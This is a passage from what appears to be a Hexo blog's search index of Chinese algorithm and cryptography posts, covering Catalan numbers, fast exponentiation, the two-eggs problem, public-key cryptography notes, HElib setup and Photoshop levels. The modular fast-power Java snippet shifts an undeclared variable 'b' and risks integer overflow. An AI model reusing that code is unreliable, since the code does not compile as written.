很容易证明，通过这种方式得到的两排人，每排都是从矮到高排列的。那么接下来的问题就是保证第二排比第一排对应的人高。问题转换为，这样的满足条件的01序列有多少个。观察每一个出现的1，在这个1前面，至少要有1个0，如果1前面还有1，那么，1的个数一定应小于0，这样就回到了上面的问题中，求01序列，满足0的数量总是大于等于1。扩展思考：如果问的不是排队的可能方案数呢？如果让你打印所有排队方案呢？回溯法能够很好的解决这类问题。我在文末进行了更新，给出了代码求解方案。 III.一般性场景：由递推公式求解卡特兰数该部分我会给出题目中的BST问题的解法(如果你是通过搜索题目中的二叉树关键字进来的，抱歉，现在才让你看到你想看的，哈哈)，然后试图通过这类解法“感悟”卡特兰数的基本数学思想，最后我会给出自己的理解，希望能给你也带来启发。 问题描述求N个节点构成的不同构的二叉树的个数/求N个大小不同的节点组成的二叉搜索树的不同形态数。借用用wiki的图： 分析 先考虑只有一个节点的情形，设此时的形态由f(1)中，显然，f(1)=1; 如果有两个节点呢？现固定一个节点，那么另个节点会有左右子树两种分布情况，故有f(2)=f(1)+f(1); 再讨论三个节点的情形，仍然固定一个节点，即根节点，然后此时还剩两个节点，那么左右子树的总节点分布情况为(2,0)，(1,1)和(0,2)，f(3)=f(2)f(0)+f(1)f(1)+f(0)*f(2)。f(0)表示什么也没有，不会增加额外的情况，故取值为1； 那么对于n个节点呢？同样，固定一个节点，那么左右子树的分布情况为(n-1,0),(n-2,1),(n-3,2)……(1,n-2),(0,n-1)，故f(n)=f(n-1)f(0)+f(n-2)f(1)+……+f(1)f(n-2)+f(0)f(n-1) 当得出这个公式的时候，相信大家以及明白接下来怎么做了吧。交给程序去递归就好啦。这里就不再多说。而这个公式也正是卡特兰数组的递推公式。 总结卡特兰数的递推公式是：C（0）=1；C（1）=1；C(n)=C(0)C(n-1) + C(1)C(n-2) + …… + C(n-1)C(0);其实序列类场景也是可以用这种一般性方法求解的，大家有没有发现，无论是上面的排队问题，多边形分割问题，还是路径规划问题，它们都有一个共同点，就是初始状态一定是确定的，也就说，序列第一项是固定的，那么剩下的n-1项就可以用分治的思路分割成两个子序列去解决就可以了。抽象点概括下，就是对于问题A，规模为n，要解决这个问题，可以用分治的思想，首先固定其中某一个元素，将剩下的n-1个元素拆分成两个小问题，这两个小问题的规模分别是(0,n-1) (1,n-2) (2,n-3) … (n-1,0)。卡特兰数表现了一种符合乘法原理事件的本性，某种程度上，反映了我们思考问题的方式，故而能够在许多场合得到应用。卡特兰数的递推公式可以表示为： $A _{n+1}=\sum_{i=0}^n aA _iA _{n-i}$ 卡特兰数的通项是 $A _n= \frac{1}{n+1}C _{2n}^n = C _{2n}^n-C _{2n}^{n-1} $ 至于如何由递推公式，推出通项的，一种思路就是我在第二部分中讲到的“折线法”，但是是通过构造具体问题推导出来的，很巧妙，看完之后我也是回味了半天。但是如果抛开这些问题，直接给你个递推公式，然后让你求通项公式，怎么下手去做呢？ 有没有纯数学角度的推算方法呢？折线法和递推求法的本质联系在哪呢？ 这里留给读者，同样也是留给我的一个开发性问题。如果谁要比较好的证明思路，欢迎私信给我哈。我的邮箱是：guojunyan93@qq.com 最后，给大家推荐一个奇妙的网站The On-Line Encyclopedia of Integer Sequences，网址是oeis.org，对数列有兴趣的同学欢迎戳进去感受数学之美， 更新下，博主五岳在他的文章《从《编程之美》买票找零问题说起，娓娓道来卡特兰数——兼爬坑指南》讲到一种通过构造母函数来推导卡特兰通项的方法，有兴趣的同学可以去看下。 更新2017-5-19： 今天在牛客上做到一个题，用到了卡特兰数的知识。那道题我会单独写一篇博客，这里把其中一个子问题抽象出来，给出代码方案：给了长度为2n的顺序数列，先将数列分成两排，要求第一排的每一列小于等于对应的第二排的数字，每排顺序排列，打印出所有排序方案。 这里我用回溯方法解决，对所有方案进行深度优先遍历，如果‘0的数量大于1’（参加上文排队问题）,则返回上层。这里我构造了两个空数列：firstLine和secondLine，从头到尾遍历长度为2n的原数组arr，每次都有两个选择方案：将arr[i]放入到firstLine或secondLine。怎么放呢？没关系，我们先进行遍历，按顺序来，如果放入后firstLine的长度大于等于secondLine，则进入下层循环。另外，为了保证回溯，一定要记得及时清理状态，在每次循环后将两个数组的状态返回为上一层的样子。 代码如下：1234567891011121314151617181920212223function catalanSort(arr,firstLine,secondLine,i)&#123; var n=arr.length/2; if(firstLine.length==n) &#123; console.log(firstLine); &#125; else &#123; for (var j = 0; j &lt; 2; j++) &#123; if (j == 0) &#123; firstLine.push(arr[i]); &#125; else &#123; secondLine.push(arr[i]); &#125; if (firstLine.length &gt;= secondLine.length) &#123; catalanSort(arr,firstLine,secondLine,i+1); &#125; if(j==0)&#123; firstLine.pop(); &#125;else&#123; secondLine.pop(); &#125; &#125; &#125;&#125; 调用方式就是：1catalanSort(arr,[],[],0)]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>卡特兰数</tag>
        <tag>算法</tag>
        <tag>面试</tag>
        <tag>BAT</tag>
        <tag>数列</tag>
        <tag>回溯法</tag>
        <tag>深度优先搜索</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快速求幂算法分析及java实现]]></title>
    <url>%2F2017%2F04%2F03%2Ffast-pow%2F</url>
    <content type="text"><![CDATA[ACM的竞赛中，经常会出现涉及到大数模幂运算的题目，如求解2的10000次方模100000009的结果，这就需要我们设计一种有效的求幂算法。本文将结合的以上应用场景，分析以下几种常用的求幂算法并给出java代码的实现： 递归方法：二分快速求幂（又叫矩阵快速幂算法） 非递归方法：二进制转换法 二分快速求幂这种方法的设计思想很简单：对于A的n次幂，当n为偶数时，A^n = A^(n/2) A^(n/2)；当n为奇数时，A^n = A^(n/2) A^(n/2) * A （其中n/2取整）。因此，直接用递归求解即可。时间复杂度为O（lgn）。这里就不再多说，贴出代码： 12345678public static long pow(int a,int n)&#123; if(n==0) return 1; if(n==1) return a; if(n%2==0) return pow(a*a,n/2); else return pow(a*a,n/2)*a;&#125; 二进制转换法以上方法效率是不高的，因为函数调用的代价非常昂贵。这里我们考虑用循环的方法进行改善，举个例子： 对于5的900次方：$900=2^9+2^8+2^7+2^4+2^3+2^1=512+256+128+16+8+2$因此计算可转化为：$5^{900}=5^22^85^{16}5^{128}5^{256}5^{512}$我们可以按以下步骤求解：$5^2=55$$5^4=5^25^2$$5^8=5^45^4$$5^{16}=5^85^8$$5^{32}=5^{16}5^{16}$$5^{64}=5^{32}5^{32}$$5^{128}=5^{64}5^{64}$$5^{256}=5^{128}5^{128}$$5^{512}=5^{256}5^{256}$ 其实细想以下，数学原理跟第一种方法是一样的，但是在代码实现层面，我们进行了优化，看一下代码： 1234567891011public static double pow(double a, int n)&#123; double res=1; while(n&gt;0)&#123; if((n&amp;1)==1)&#123; //相当于n%2 != 0 res *= a; &#125; a*=a; n&gt;&gt;=1; &#125; return res;&#125; 我们知道定义long型整数的话，当结果大于2的64次方就溢出了，往往遇到大数求幂题目会给出模数，对结果进行求模处理，根据公式a^n% m=(…((aa % m)a%m)……）*a%m，我们对上述代码做以下改进： 1234567891011public static long pow(int a, int n, int m)&#123; //m表示模数 long res = 1; while (n &gt; 0) &#123; if ((n &amp; 1) == 1) res = (res * a) % m; a = (a * a) % m; b &gt;&gt;= 1; &#125; return res; &#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>面试</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态规划法解析two eggs problem及其延伸问题]]></title>
    <url>%2F2017%2F03%2F28%2Ftwo-eggs-problem%2F</url>
    <content type="text"><![CDATA[Two eggs problem可以说是互联网面试中老生常谈的算法题了，经常可以在各大互联网公司的笔试真题中看到它的各类变种（腾讯大厦，球掉落问题，玻璃珠问题等等）。本文将深入探讨此类问题及其延伸问题的通用解法，并给出javascript代码实现。 问题描述Two-eggs problem首先看下游戏的定义： 有一幢100层的大楼，玩家可以到达大楼的任意楼层。现给玩家两个一模一样的鸡蛋，当玩家拿着鸡蛋从某一楼层扔下时，一定会出现两个结果，鸡蛋碎了或者没碎（完好无损）。该大楼有一个临界楼层，低于它的楼层往下扔鸡蛋时鸡蛋不会碎，等于或高于它时会碎。请为该玩家设计一种丢鸡蛋策略，使得该策略下的最坏情况的次数比其他任何策略最坏的次数都少。输出该策略下的最坏情况次数。 很多人乍一看到这道题会很懵，什么叫丢鸡蛋策略？怎么设计？如果用代码给出设计方案？你可能会去把问题分解成第一次在哪个楼层扔，鸡蛋会不会碎，还剩几个鸡蛋，第二次在哪个楼层扔，鸡蛋会不会碎，还剩几个鸡蛋，第三次……然后你就会觉得这是一个特别复杂/抽象的问题，然后就放弃了。 所以此类问题我们要换个思路去想，这里先抛开那些经典的算法思想，总结下解题思路： 分解为若干子问题 化抽象为具体，不妨代入未知数，先进入子问题再说 简化问题求解，比如将2个鸡蛋改成1个鸡蛋，100层楼改成10层楼 根据上面两步，确定最终使用的方法（动态规划？回溯？分治） 有了以上的思路，我们很容易想到，用递归的思想去解决，如何递归呢？这里我们暂时卖下关子，看一下此类问题的通用表示方法：n-eggs problem 扩展到 n-eggs problem 现在有m层楼（m&gt;1）,玩家手里有n个鸡蛋，求设计一种方法，使得在该方法下找到临界楼层的最坏情况次数最少。 这个问题可以抽象为这样一个函数： throwNumber(floors,eggs) =&gt; numOfWorstCase 函数入口是楼层数和鸡蛋数，返回最优方案的最坏次数（throwNumbers of the worst case of the best strategy）。 在下文中我们不妨用$\it Tn(f,e)$来表示f层楼e个鸡蛋的输出结果。 解决方案回到刚才讨论的解决思路，我们不妨分别考察下一个鸡蛋，两个鸡蛋，三个鸡蛋的$\it Tn(f,e)$ 求法。 one-eggs problem 这类问题是不是很简单？因为你就只有一个鸡蛋，所以为了保证一定能找到临界楼层，我们只能从第一层开始遍历楼层，所以最坏情况的次数是楼层f, 那么可以得到： $\it Tn(f,1) = f $ two-eggs problem我们不妨设 $\alpha _i $ 为第i次扔蛋选择的楼层。每次扔蛋有两种结果： 鸡蛋碎了，那么临界楼层一定在 $\alpha _i $层及以下楼层范围内，问题转移为1个蛋，$\alpha _i $-1层楼的问题，即$\it Tn(\alpha _i-1,1) $ 鸡蛋没碎，那么临界楼层一定在 $\alpha _i $层以上，问题转移为2个蛋，100-$\alpha _i $层楼的问题，即$\it Tn(100-\alpha _i,2) $ 可以用以下流程图表示： 同时，我们应注意到$\it Tn(f,1) = f $，因此在第1次扔蛋后，蛋碎了，我们将直接得出确定性结果，如果蛋没碎，则问题转化为100-$\alpha_1$层楼的two-eggs问题，直接递归就可以求解了。说到这里，这道题其实就已经解决了，剩下的问题就是编程了。但是我们的要求要更高一些，通过数学推导，我们可以将时间复杂度降到O(1)，如何做到呢？ 试想我们第一次在第n层扔鸡蛋，如果碎了，我们只剩一个蛋，接下来就只能从第一层开始向上遍历到第n-1层，直到鸡蛋摔碎，此时的worstcase次数为n-1，加上第一次扔，总次数为n； 如果没碎，我们应该向上跳跃n-1层取试，即取n+（n-1）层(这样能保证如果鸡蛋碎了,我们的worstcase即从第n+1层向上遍历到n+（n-1）层次数为n-2，加上第二次扔的一次，第一次的一次，总次数仍为n); 如果第2次扔没碎，则应取n+(n-1)+(n-2)层扔，仍没碎则取n+(n-1)+(n-2)+(n-3),……直到达到第n次向上取1层。 为了保证一定能找到临界楼层，需要满足： n+(n-1)+(n-2)+…+1&gt;=100对n求解，向上取整，即得到最优方案的worstcase次数。如果你觉得以上论述不够严谨的话，我们可以通过数学公式进行推导论证： 首先注意到:$ Tn(\alpha,1)=\alpha$第一次扔蛋后，我们可以得到最坏情况下次数满足不等式： $ Tn(100,2) = max(Tn(\alpha_1-1,1)+1,Tn(100-\alpha_1,2)+1)\leq\alpha_1 $$\Downarrow$$Tn(100-\alpha_i,2)\leq\alpha_1-1$$\Downarrow$将不等式(2)带回不等式(1)：$ Tn(100-\alpha_1,2) = max(Tn(\alpha_2-1,1)+1,Tn(100-\alpha_1-\alpha_2,2)+1)\leq\alpha_2 \leq\alpha_1-1$$\Downarrow$…$\Downarrow$$Tn(100-\alpha_n,2) = max(Tn(\alpha _n-1,1)+1,Tn(100-\alpha _1-\alpha _2…-\alpha _n,2)+1)\leq\alpha _n \leq\alpha _{n -1}-1$$\Downarrow$$\alpha _n\leq\alpha _{n -1}-1…\leq\alpha _1-(n-1)$注意到，当$\alpha_n$为1时，达到最终状态，不再继续递归，另外式中还应有约束条件：$100-\alpha_1-\alpha_2…-\alpha_n&gt;0$，即$\alpha_1+\alpha_2…-+\alpha_n$的值应恰好大于100。我们直接将$\alpha_n$取值为1，则根据最后一项不等式可推： 100$\leq n+(n-1)+…+2+1\leq \alpha_1+\alpha_2…+\alpha_n$$\Downarrow$$1+2+…+n= \frac{n(n+1)}{2}\geq 100$解出n$\geq$13.651, 取n=14. 可以看到，此题的解题关键就是分解出子问题，找到子问题之间的重叠关系，推出状态转移方程。 有了以上方法论，相信n-eggs问题我们也能迎刃而解。 n-eggs problem以3-eggs为例 如果鸡蛋破碎，问题转化为k-1层下的2-eggs问题，状态转移方程为Tn(n,3)=1+Tn(k-1,2) 如果鸡蛋摔碎 ，问题转化为n-k层下的3-eggs问题，状态转移方程为Tn(n,3)=1+Tn(n-k,3) 现在我们已经知道: $Tn(n，1)=n$$Tn(n，2)=min (x) s.t. \frac{x(x+1)}{2}\geq 100 $ 因此我们只要需要递归求解，动态更新最坏情形下的次数即可。但是还有一个很重要的点需要注意，这一点也是我们为什么采用动态规划法的原因，我们在下一部分展开。 n-eggs其他将到这里，如果分解子问题，如何递推出状态转移方程已经不用多说了，直接将上部分Tn(f,e)中的3替换成未知量n,2替换成n-1即可。我们可以很容易的写出代码来，但如果仅仅如此，我们的代码很可能会内存溢出。 内存溢出的原因其实很好理解，这里不多解释。如何避免呢？这里就是动态规划法的优势所在了，由于经分解得到子问题并不是互相独立的。我们如果保存已解决的子问题的答案，在需要时再找出已求得的答案，这样就可以避免大量的重复计算，节省时间。这里我们在写代码时创建一个二维数组memory[F][E]来保存每次计算得出的Tn(f,e)的结果，并在函数入口处判断memory[f][e]是否存在，如果存在直接返回结果。 代码实现这里我用的javascript实现，运用闭包存储计算结果。 123456789101112131415161718192021222324252627282930313233function throwNumber() &#123; var memory=[];//声明一个存储结果的一维矩阵 return function(floor,eggs)&#123; if(typeof(memory[floor])!='object') memory[floor]=new Array();//动态创建二维矩阵 if( memory[floor][eggs]) &#123; return memory[floor][eggs];&#125;//如果矩阵中存在结果，直接返回结果 if(floor&lt;3) &#123; memory[floor][eggs] = floor;return floor;&#125; if(eggs==1) &#123; memory[floor][eggs] = floor;return floor;&#125; if(eggs==2)&#123; //计算2-eggs问题 var sum=0,i=0; while(sum&lt;floor)&#123; i++; sum=i*(i+1)/2; &#125; memory[floor][eggs]=i; return i &#125; if(eggs&gt;2)&#123; //计算n-eggs问题 var res=floor; for(var i=2;i&lt;floor;i++)&#123; var isBroken=arguments.callee(i-1,eggs-1)+1; var notBroken=arguments.callee(floor-i,eggs)+1; var temp=isBroken&gt;notBroken?isBroken:notBroken; (res&gt;temp) &amp;&amp; (res =temp)&gt;0; &#125; memory[floor][eggs]=res return res; &#125; &#125;&#125;//主函数function Tn(f,e) &#123; return throwNumber().call(this,f,e);&#125; 附部分计算结果 floor 2-eggs 3-eggs 4-eggs 5-eggs 50 10 7 6 6 100 14 9 8 7 200 20 11 9 8 300 24 13 10 9 st=>start: Tn(100,2) e=>end: Tn(a-1,1) op=>operation: 选择在a层扔蛋 cond=>condition: 蛋是否碎了？ ee=>operation: Tn(100-a,2) st->op->cond cond(yes)->e cond(no)->ee{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12} var code = document.getElementById("flowchart-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value)); var diagram = flowchart.parse(code); diagram.drawSVG("flowchart-0", options);]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>面试</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F03%2F27%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[【学习笔记】非交互式的可认证公钥密码体制]]></title>
    <url>%2F2017%2F03%2F08%2Fpki-notes%2F</url>
    <content type="text"><![CDATA[毕业论文中的协议安全性依赖于CDH困难假设。相较于对称密码体制，非交互式的可认证公钥密码体制解决了密钥存储问题 传统的公钥密码体制存在的问题：公钥替换攻击 –&gt; 解决方法：PKI（基于证书的） PKI： CA, RA CA将用户提交的公钥以及有效信息进行封装并使用认证中心的私钥进行数字签名 存在问题： 证书的管理问题是一个很复杂的工作 合法性验证会造成额外的通信和计算负担 基于身份的公钥密码体制（ID-PKC）: 公钥是电子邮箱，Ip地址等用户的身份信息 用户私钥由一个可信机构——私钥生成中心（PKG）生成，（私钥）=F（公钥） 与传统公钥密码相比： 不需要证书来实现用户公钥和身份的绑定 存在密钥托管问题 为了缓解基于身份加密的密钥托管问题，现有的方案如：利用门限的思想设立多个PKG，每个PKG只为用户生成私钥的一部分。 无证书公钥密码体制：KGC生成部分私钥 三种基本的攻击模型： 选择明文攻击CPA 选择密文攻击CCA 适应性选择密文攻击CCA2 可证明安全理论的三大要素： 困难问题假设 安全模型建设 规约方法，目前通用的规约模型： 标准模型 随机预言模型（Random Orcale Model,ROMn ） 基于ECC的可认证密钥协商方案： 相比于传统的可认证密码体制：采用共享口令机制，不需要CA，没有证书管理问题，都能够防止中间人攻击 相比于无认证密码体制：认证过程会造成额外的通信和计算负担 相比于基于身份的公钥密码体制：没有密钥托管问题 该方案的安全性依赖于椭圆曲线离散对数难题 具有完美向前安全性，能够防止重放攻击 问题：口令的安全性，口令泄露则无法防止中间人攻击 安全性分析过于单薄，论文未使用可证明安全理论的规约方法]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同态加密开源库Helib使用方式]]></title>
    <url>%2F2017%2F03%2F08%2Fhelib%2F</url>
    <content type="text"><![CDATA[全同态算法的编译和测试（BGV方案） 系统：windows7及以上 配置软件包： 安装dev-C++，下载地址：http://yunpan.cn/cy3G9PJbJwBtn提取码 513a 下载HElib文件包，下载地址：http://yunpan.cn/cy3GDLkzik6r7提取码 a7de 下载WinNTL-6_2_1包，下载地址：http://yunpan.cn/cy3GzxTG69AtT提取码 fb6b 下载HElib.a文件，下载地址：http://yunpan.cn/cy3GpK43iScwf提取码 87b0 下载NTL-6_2_1.a文件，下载地址： http://yunpan.cn/cy3GpiNMKgHpH提取码 77ce 配置方法：1、 下载安装dev-C++； 2、 在D盘或者其他位置建立文件夹bgv； 3、 将刚才下载的四个文件包拷入bgv文件夹中，并将WinNTL-6_2_1和HElib解压； 4、 文件——项目——新建项目——ConsoleApplicaion，输入项目名称test，点击确定，选取bgv文件件，点击保存，继而会同时出现一个CPP文件，命名为main.cpp； 5、 项目——项目属性——参数——加入库或者对象，将HElib.a和NTL-6_2_1.a加入； 6、 继而点击 文件/目录——包含文件目录，将HElib\src和WinNTL-6_2_1\include加入目录中，然后点击确定； 7、之后便可以测试BGV全同态算法库了 Linux下安装环境比较简单，首先安装gmp，然后安装NTL，之后直接make便可以了，gmp和NTL的Linux安装可以百度，很容易解决！]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>同态加密</tag>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ps中对色阶的理解和分析，色阶的使用原理]]></title>
    <url>%2F2016%2F06%2F19%2Fps-skill%2F</url>
    <content type="text"><![CDATA[色阶就是用直方图描述出的整张图片的明暗信息,从左至右是从暗到亮的像素分布，黑色三角代表最暗地方(纯黑)，白色三角代表最亮地方(纯白)。灰色三角代表中间调。 先上一张“问题图”吧 这张图两个问题： 左上方过曝 暗部像素过多 这两个问题都很好的反映在了它对应的色阶图上。 最右边突然不连续的长柱就表示亮度接近255的像素个数，不是平滑上升。 修改色阶其实就是扩大照片的动态范围(动态范围指相机能记录的亮度范围，通过调整输出就可以实现)，查看和修正曝光，调色，提高对比度等作用。曝光过度就会亮度溢出，曝光不足则会暗部溢出]]></content>
      <categories>
        <category>技术杂谈</category>
      </categories>
      <tags>
        <tag>photoshop</tag>
        <tag>色阶</tag>
      </tags>
  </entry>
</search>
